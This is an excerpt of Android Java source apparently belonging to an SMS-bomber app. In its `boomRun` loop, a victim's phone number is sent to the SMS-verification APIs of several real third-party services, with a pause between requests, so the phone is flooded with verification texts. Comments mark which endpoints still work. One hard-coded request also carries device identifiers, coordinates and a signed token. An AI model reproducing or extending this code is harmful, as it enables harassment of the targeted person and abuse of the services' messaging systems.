...
import com.jiangyu.common.utils.Log;
...
public class MainActivity extends BaseActivity {
    ...
    private StringCallback callback = new StringCallback() {
        ...
        public void onSuccess(final Response<String> response) {
            android.util.Log.d("返回内容:",response.body());
    ...
    private Runnable boomRun = new Runnable() {
        ...
        public void run() {
            ...
            try {
                ...
                OkGo.<String>post("https://api2.quhepai.com/user/getsmscode?os=Android&model=SM-G930F&area_id=110000&rctk=&imei=865821079483270&hpid=&ver=1.6.9&long=106.67963615746643&build=1712211344&token_temp=&netk=&nonce=1515146882410&token=&sa=SvWDOSgflCTktWN2gZJeA26s%2FKsJfvkYUf3h8KsEJ%2FxBUE3KOW%2BlQWy3g9bqRlNZ0EYGzUKwOb%2F0%0AYgOREoKTl3mmqa2pcsblrYUDbkDcT8dQiWJ9VxTaKqeIEbVl38VE4rXB1avYbPR2zOkD28c7%2Fas%2F%0Ap0R38lq3nziMVHRap34%3D&company=samsung&logined=0&api=39&verCode=446&user_id=&ch=hepai_s_018&lat=26.636185489185326&type=1&phone=" + sphone).tag(this).execute(callback);//能用，有间隔
                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
                OkGo.<String>post("https://www.1yuanxing.com/apiAngular/getSMS.jsp?username=" + sphone).tag(this).execute(callback);//能用，有间隔
                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
                OkGo.<String>post("http://api-cc.babybus.org/User/VerificationCode?al=403&ost=1&type=1&channel=A002&phone=" + sphone).tag(this).execute(callback);//不能用了
                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
